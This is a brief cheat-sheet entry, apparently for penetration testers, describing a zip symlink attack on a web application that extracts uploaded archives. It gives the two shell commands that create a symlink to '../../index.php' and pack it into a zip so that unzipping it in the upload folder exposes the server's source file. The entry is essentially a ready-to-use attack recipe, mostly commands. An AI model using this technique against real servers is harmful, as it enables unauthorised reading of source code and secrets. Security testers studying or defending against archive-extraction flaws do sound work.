# Unzip file vulnerability

Imagine that we can unzip a .zip that we uploaded in /upload/id/
And we want to extract the content of index.php 

Create a symlink

```bash
ln -s ../../index.php link

zip test.zip link
```
